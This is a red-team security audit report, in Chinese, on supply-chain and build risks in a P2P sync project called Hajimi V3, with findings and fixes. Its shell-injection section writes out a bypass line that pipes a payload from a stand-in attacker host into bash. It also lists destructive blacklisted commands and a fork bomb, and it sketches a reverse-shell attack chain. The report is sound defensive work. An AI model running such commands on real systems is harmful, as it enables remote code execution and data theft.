# 红队对抗审计报告：供应链与构建环境风险

**项目**: Hajimi V3 (local-first P2P sync system)  
**审计编号**: R01-SUPPLY-CHAIN-RISK  
**审计方**: Red Team Security Auditor  
**日期**: 2026-04-16  
**分类**: 供应链安全 / 构建环境 / 红队对抗审计

---

## 审计范围与方法

本次审计聚焦于 Hajimi V3 的**供应链攻击面**与**构建环境弱点**，采用 adversarial（对抗性）视角，以“后果优先”原则评估每一发现。审计方法包括：静态源码分析、依赖漏洞扫描（`npm audit`）、硬编码密钥探测（Gitleaks 模式）、Unsafe Rust 代码统计、Shell 命令注入路径推演，以及 WebRTC 信令协议的 MITM 场景建模。未覆盖动态渗透测试（DAST）与 CI/CD 流水线完整性审计，相关项标记为 N/A。

Hajimi V3 的供应链与构建环境存在**高风险**。`package-lock.json` 携带 4 项高危 npm CVE，Rust 侧因构建机器缺失 `cargo audit` 而完全盲飞；`curl | bash` 远程脚本执行与未经身份验证的 WebRTC 信令服务器为攻击者提供了直接的 RCE 与 P2P MITM 入口。Shell 命令注入防护采用脆弱的黑名单策略，易被绕过。若上述任一链路被攻破，可导致开发者机器沦陷、用户端到端数据被窃、云端记忆密文被离线爆破，或生产二进制被植入持久化后门。更危险的是，这些弱点可串联成链：信令层 MITM 诱导用户触发 Shell 注入，进而窃取云端密钥并触发加密降级，最终完成对用户全部记忆资产的接管。

---

## 2. 16 项对抗性检查清单

| ID | 检查项 | 状态 | 发现摘要 | 后果 (So What?) |
|---|---|---|---|---|
| S1 | 依赖漏洞扫描 (npm) | [❌] | `tar`、`path-to-regexp`、`express-rate-limit` 等 4 项高危 CVE 未修复 | 可导致构建/运行时 RCE 或 DoS |
| S2 | 依赖漏洞扫描 (Rust) | [❌] | `cargo audit` 未安装，Rust CVE 零覆盖 | 可导致带毒 crate 引入后门而无人知晓 |
| S3 | 硬编码密钥/凭据 | [⚠️] | 生产环境 LLM/Redis 密钥未硬编码，但 E2E 测试中 TURN 凭据存在 `\|\| 'test'` 回退 | 可导致测试环境被利用为横向移动跳板 |
| S4 | 远程脚本执行风险 | [❌] | `install-evm-toolchain.sh` 使用 `curl -L https://foundry.paradigm.xyz \| bash` | 可导致远程服务器被投毒后开发者机器直接沦陷 |
| S5 | Unsafe Rust 代码审计 | [⚠️] | 发现约 15 处 `unsafe` 块；部分有 SAFETY 注释与对齐检查，但 `vector_text_hybrid.rs` 等直接裸调 `from_raw_parts` | 可导致越界读写或内存损坏触发 RCE |
| S6 | WebRTC / P2P 身份验证 | [❌] | 信令服务器无连接认证，`clientId` 由 `Math.random()` 生成 | 可导致攻击者伪造 peerId、拦截 SDP/ICE，实施 MITM 或重定向流量 |
| S7 | Shell 命令注入防护 | [❌] | `shell.rs` 使用字符串黑名单过滤，`-c` 直接传参无转义 | 可导致绕过黑名单执行任意系统命令（RCE） |
| S8 | 加密实现降级路径 | [⚠️] | 云端记忆存在 `degraded_mode`，回退至弱 Scrypt 参数 (n=20, r=8, p=1) | 可导致攻击者诱导降级后离线暴力破解用户密文 |
| S9 | 依赖版本固定 (Pinning) | [⚠️] | `Cargo.toml` 使用 `version = "1.0"` / `"1"`；`package.json` 使用 `^` | 可导致供应链投毒窗口扩大（浮动版本引入恶意补丁） |
| S10 | CI/CD 流水线完整性 | [N/A] | 本次审计未覆盖 CI/CD 配置文件 | 无后果（误报/范围外） |
| S11 | 容器镜像来源与签名 | [N/A] | 未涉及容器运行时镜像扫描 | 无后果（误报/范围外） |
| S12 | SAST/DAST 工具覆盖 | [❌] | 未见自动化 SAST 集成（如 Semgrep、Bandit、Clippy deny 不全） | 可导致重复出现的同类漏洞漏网 |
| S13 | 恶意许可证/依赖 | [⚠️] | 未对依赖树进行许可证与作者信誉审计 | 可导致恶意 copyleft 或作者删库/投毒的法律与运营风险 |
| S14 | FFI 边界安全 | [⚠️] | `storage_gateway.rs` 多处 `unsafe extern "C"` 无可见的输入边界校验摘要 | 可导致跨语言调用时内存损坏或 UAF |
| S15 | 测试凭据强度 | [⚠️] | TURN 测试回退密码为 `'test'` | 可导致测试实例被弱口令扫描攻破 |
| S16 | 事件响应与回滚 | [N/A] | 未审计应急响应流程 | 无后果（误报/范围外） |

---

## 3. 关键发现深度剖析

### 3.1 供应链投毒：`curl | bash` 远程脚本执行

**位置**: `src/foundation/scripts/setup/install-evm-toolchain.sh:53`  
**代码片段**: `curl -L https://foundry.paradigm.xyz | bash`

**分析**: 这是教科书级别的供应链投毒向量。脚本下载与执行之间无任何签名验证、checksum 校验或来源锁定。一旦 Paradigm 的域名被劫持、CDN 被篡改或发布密钥泄露，任意恶意代码将直接在开发者机器上执行。此类攻击已有先例（如 apifox 事件），且难以被本地杀毒软件识别，因为脚本执行上下文是用户主动发起的安装流程。更进一步，该脚本位于项目仓库中，新入职开发者或被攻击者篡改的 README 引导词可能直接触发执行，扩大了攻击面。

**后果**: 可导致构建环境完全沦陷，攻击者可植入针对 Hajimi V3 代码库的后门、窃取本地 `~/.ssh` 私钥、`~/.cargo/credentials` 以及环境变量中的 API 密钥，进而污染后续所有发布版本。若该脚本在 CI 环境中运行，同样可导致 CI runner 沦陷与供应链下游污染。由于该脚本被放置在项目 `scripts/setup` 目录，新员工 onboarding 文档极有可能引导其执行，进一步放大影响面。

---

### 3.2 npm 高危 CVE：构建即埋雷

`npm audit` 检出 7 项漏洞，其中 4 项高危、3 项中危，均未修复：

- **`tar` <=7.5.10 (CVSS 8.8)**: 硬链接路径遍历、符号链接投毒、Unicode ligature 竞争条件。`@mapbox/node-pre-gyp` 继承该风险，在 `npm install` 阶段即可触发任意文件覆盖。
- **`path-to-regexp` 8.0.0–8.3.0 (CVSS 7.5)**: ReDoS，攻击者通过构造恶意 URL 路径可导致 CPU 耗尽拒绝服务。
- **`express-rate-limit` 8.2.0–8.2.1 (CVSS 7.5)**: IPv4-mapped IPv6 地址绕过双栈网络的客户端限流，可导致暴力破解或资源耗尽攻击。
- **`@mapbox/node-pre-gyp` <=1.0.11**: 继承 `tar` 的全部漏洞面，在原生模块编译时暴露文件系统风险。
- **`hono` <=4.12.13 (MODERATE)**: 原型污染 via `__proto__`、cookie 名验证绕过、`toSSG()` 路径遍历、中间件绕过 via 重复斜杠、JSX SSR HTML 注入。
- **`@hono/node-server` <1.19.13 (MODERATE)**: `serveStatic` 中间件绕过 via 重复斜杠。
- **`brace-expansion` (MODERATE)**: 零步序列导致进程挂起与内存耗尽（DoS）。

**后果**: 可导致开发者本地构建时敏感文件被覆盖、运行时服务被 DoS 打挂、API 限流被绕过进而引发账户接管，或攻击者通过原型污染篡改应用内部对象实现权限提升与逻辑绕过。其中 `tar` 的硬链接遍历在 `npm install` 阶段即可触发，意味着 merely 拉取依赖就可能导致系统文件被覆写。

---

### 3.3 未经身份验证的 WebRTC 信令服务器

**位置**: `src/engine/p2p-sync/src/signaling-server.js`

该 WebSocket 信令服务器在连接层**零认证**。任何能够连通端口的网络参与者均可注册 `peerId` 并转发 SDP/ICE 候选。`clientId` 由 `Math.random().toString(36).substring(2, 10)` 生成，熵值极低且不具备密码学不可预测性。攻击者可在同一局域网、公网可达场景，或通过网络扫描发现该端口后，枚举或预测 `clientId` 并抢占合法 peer 的注册名。

由于 WebRTC 的端到端加密依赖于正确的 SDP/ICE 交换，一旦信令层被控制，攻击者可以实施 "SDP 替换" 攻击：将受害者的连接重定向至攻击者控制的 TURN 或恶意 peer，从而完全绕过 DTLS/SRTP 的防护意图。

**后果**: 可导致攻击者轻松伪造合法 peerId，拦截或篡改 SDP 与 ICE 候选，进而将 P2P 连接重定向至受控节点，实施端到端流量 MITM、注入恶意同步数据，或在用户完全无感知的情况下记录全部通信内容，彻底破坏 local-first 的隐私承诺。

---

### 3.4 Shell 命令注入：黑名单形同虚设

**位置**: `src/engine/tool-system/src/shell.rs`

`ShellTool` 的“安全机制”是一组字符串黑名单（`rm -rf /`、`format`、`del /f /s /q c:\`、fork bomb `:(){ :|:& };:` 等）。命令通过 `-c` 直接传递给 shell，无参数化、无转义、无沙箱。攻击者可使用以下方式轻松绕过：
- 十六进制/八进制转义（`$'\x72\x6d'`）
- 环境变量间接引用（`eval "$EVIL_CMD"`）
- 路径通配符（`/bi?/rm`）
- 间接调用其他已安装二进制（`python3 -c '...'`）

`cwd` 虽校验 `allowed_paths`，但命令字符串本身在 shell 解析后才生效，路径限制无法阻止 `cd /allowed && curl attacker.com/payload | bash` 这类间接逃逸。黑名单作为唯一防线，在对抗场景下属于“心理安慰”级别。

**后果**: 可导致经过有限构造的输入直接触发远程代码执行（RCE），删除用户数据、植入持久化后门、窃取本地文件系统中的密钥与配置文件，或横向移动至内网其他主机。

---

### 3.5 云端记忆加密降级路径

**位置**: `src/intelligence/memory/src/cloud.rs` 及 codex-twist 对应模块

当前实现默认使用 Age (X25519) + Argon2id (t=3, m=64MB, p=4)，参数合理。但代码中存在 `degraded_mode` 分支，当检测到内存压力或特定错误时会回退至 Scrypt (`derive_key_scrypt`)，参数为 `Params::new(20, 8, 1, 32)`。该参数远低于现代标准（n=20 即 2^20 次迭代在 GPU/ASIC 面前抵抗能力有限，且 r=8, p=1 无法充分利用内存困难性）。

**后果**: 可导致攻击者通过构造特定输入或内存压力条件触发降级路径，使得用户上传至云端的记忆密文可被离线加速暴力破解，恢复出敏感的用户记忆内容。

---

## 4. Rust CVE 盲区：`cargo audit` 缺失

当前构建机器**未安装 `cargo audit`**，这意味着 Rust 依赖树中的已知 CVE（如 `tokio`、`hyper`、`rustls`、`serde`、`chrono` 等历史漏洞）处于完全未扫描状态。项目使用大量底层网络与加密 crate，任何已知漏洞都可能被直接编译进生产二进制。与 npm 侧至少还有 `npm audit` 报告相比，Rust 侧是真正的“灯下黑”。考虑到 Hajimi V3 的核心同步引擎与智能记忆模块均重度依赖 Rust 性能，这一盲区的实际影响面甚至可能超过 npm。

值得注意的是，项目 Cargo.toml 中使用了宽松的版本约束：`serde = { version = "1.0" }`、`tokio = { version = "1" }`、`chrono = { version = "0.4" }`。虽然 `Cargo.lock` 理论上可以锁定版本，但如果 CI 或开发者环境中 `Cargo.lock` 被删除或忽略，构建将自动拉取最新补丁版本，引入未审计代码的同时又因缺少 `cargo audit` 而无法发现其中的 CVE。

**后果**: 可导致 Rust 侧供应链漏洞成为零可见风险，攻击者利用已公开的 crate CVE 实施内存安全绕过、DoS、权限提升或密钥泄露，而开发团队对此完全无感知，直到被外部利用后才被动响应。

**立即行动**: 在 CI 中强制安装并运行 `cargo audit --deny warnings`，与 `npm audit` 并列作为合并阻塞条件；若存在需延期修复的漏洞，必须在 `.cargo/audit.toml` 中显式记录并设定过期时间，由安全负责人审批。同时建议将 `cargo-deny` 纳入 CI，以覆盖许可证合规与已知漏洞双重维度。

---

## 5. 后果矩阵 (Consequence Matrix)

| 发现项 | 风险等级 | 具体后果 |
|---|---|---|
| `curl \| bash` 远程脚本 | **严重 (Critical)** | 开发者机器 RCE，源码仓库后门植入，密钥批量泄露 |
| npm 4 项高危 CVE | **高 (High)** | 文件覆盖、DoS、限流绕过、服务崩溃、账户接管 |
| WebRTC 信令无认证 | **高 (High)** | P2P MITM、SDP 劫持、端到端数据窃听、同步数据污染 |
| Shell 黑名单绕过 | **高 (High)** | 用户机器 RCE、数据销毁、横向移动、持久化后门 |
| `cargo audit` 缺失 | **高 (High)** | Rust 侧 CVE 零可见，生产二进制埋雷，被动响应 |
| 弱 Scrypt 降级路径 | **中 (Medium)** | 云端记忆密文被离线加速破解，用户隐私泄露 |
| Unsafe Rust 块 | **中 (Medium)** | 内存损坏、UAF、潜在 RCE、信息泄露 |
| 版本未固定 | **中 (Medium)** | 供应链投毒窗口扩大，不可重现构建，回滚困难 |
| TURN 测试弱口令 | **低 (Low)** | 测试环境被扫描利用为跳板，污染生产配置 |
| SAST/DAST 缺失 | **中 (Medium)** | 同类漏洞反复出现，修复成本指数级上升 |

---

## 6. 最小修复建议 (Minimal Fix Recommendations)

以下建议按“低成本、高杠杆”排序，无需大规模重写架构即可在数日内落地：

1. **锁定并修复 npm CVE**  
   运行 `npm audit fix --force` 或手动将 `tar` 升级至 >=7.6.0、`path-to-regexp` 升级至 >=8.4.0、`express-rate-limit` 升级至 >=8.3.0、`hono` 升级至最新稳定版。将修复结果提交并锁定版本，禁止 CI 使用 `npm install`（强制使用 `npm ci`）。

2. **消除 `curl \| bash`**  
   修改 `install-evm-toolchain.sh`，改为下载固定版本的二进制包并校验 SHA-256 checksum，或通过操作系统包管理器（如 Homebrew、apt）安装。若必须执行远程脚本，需先验证 PGP 签名，并在脚本中加入 `set -euo pipefail` 与 checksum 校验逻辑。

3. **信令服务器加认证**  
   在 WebSocket 握手阶段引入基于预共享密钥（PSK）或 JWT 的 token 验证；将 `Math.random()` 替换为 `crypto.randomUUID()` 或 `crypto.randomBytes`；对同一 `peerId` 的重复注册进行拒绝或强制下线；在信令层增加连接速率限制与 IP 异常检测。

4. **参数化 Shell 命令**  
   将 `shell.rs` 从字符串拼接改为显式参数列表传递（如 Rust `std::process::Command` 的 `.arg()`），彻底消除注入面；黑名单仅作为日志告警与审计线索，不作为安全边界。若必须支持复杂管道，应引入最小权限沙箱（如 Firejail、nsjail 或容器），并禁止网络出站。

5. **引入 `cargo audit` 与版本锁定**  
   安装 `cargo audit`，加入 CI 阻塞策略；在 `Cargo.toml` 中使用 `=` 精确版本或确保 `Cargo.lock` 严格锁定，并定期由 Dependabot/Renovate 发起升级 PR。禁止手动删除 `Cargo.lock` 后无审查重新生成。建议同时启用 `cargo-deny` 进行许可证与已知漏洞双重检查。

6. **移除或加固加密降级路径**  
   删除 `degraded_mode` 中的弱 Scrypt 回退；若必须保留（如兼容旧设备），需用户显式确认并在日志中输出高可见警告，且降级事件必须上报安全监控。更优方案是将降级逻辑完全移除，改为在资源不足时拒绝加密操作并提示用户。

7. **清理测试弱凭据**  
   删除 TURN 测试文件 `src/foundation/tests/e2e/ice-v2-latency.e2e.js` 中的 `\|\| 'test'` 回退，强制要求通过环境变量注入测试凭据；在 CI 中配置 secrets 传递，并对测试代码启用 secrets 扫描规则（如 Gitleaks、TruffleHog）。

8. **Unsafe 代码增量审计**  
   对 15 处 `unsafe` 块逐一建立安全边界测试用例，优先审计 `vector_text_hybrid.rs` 与 `storage_gateway.rs` 的 FFI 边界；在模块级补充 `#![deny(unsafe_code)]` wherever possible，将非必要 unsafe 迁移至安全封装层。对 FFI 边界引入 `cbindgen` 生成的头文件与模糊测试（fuzzing）。

9. **引入基础 SAST 扫描**  
   在 CI 中集成 Semgrep（JavaScript/TypeScript 规则）与 Clippy（带 `-W clippy::unwrap_used` 等安全 lint），将高危规则设为阻塞项。该步骤可在 30 分钟内完成配置，却能持续拦截大部分注入与内存安全问题。

---

## 7. 总体风险评级

**总体风险等级：高 (HIGH)**

**攻击链示例**：
1. 攻击者利用 WebRTC 信令服务器无认证弱点，抢占合法 peerId；
2. 向受害者发送篡改后的 SDP，将其 P2P 连接重定向至攻击者节点；
3. 在同步数据中嵌入恶意 payload，诱导用户侧的 tool-system 调用 `shell.rs`；
4. 通过黑名单绕过执行反向 shell，窃取本地 `~/.hajimi/keys`；
5. 利用弱 Scrypt 降级路径，对云端记忆密文实施离线爆破。

**理由**：  
Hajimi V3 在**供应链入口**（`curl|bash`、浮动版本、npm 高危 CVE）、**运行时边界**（无认证信令、Shell 注入）以及**可见性**（Rust CVE 盲区）三个维度同时暴露显著缺陷。任意两个缺陷组合即可形成完整攻击链（例如：信令服务器 MITM → 诱导用户执行恶意 Shell 命令 → 窃取云端记忆密文）。当前状态下，项目不适合处理高敏感度数据的公开网络场景。建议在修复关键项（S1、S2、S4、S6、S7）并完成回归验证后再推进生产部署。

---

*本报告基于对 Hajimi V3 代码库的静态分析与基线扫描结果生成。建议开发团队在 14 日内对高危及严重风险项给出修复计划与时间表，并在修复完成后申请复测。*

*报告分发范围：开发团队负责人、安全团队、产品负责人。未经许可，请勿对外公开完整技术细节。*

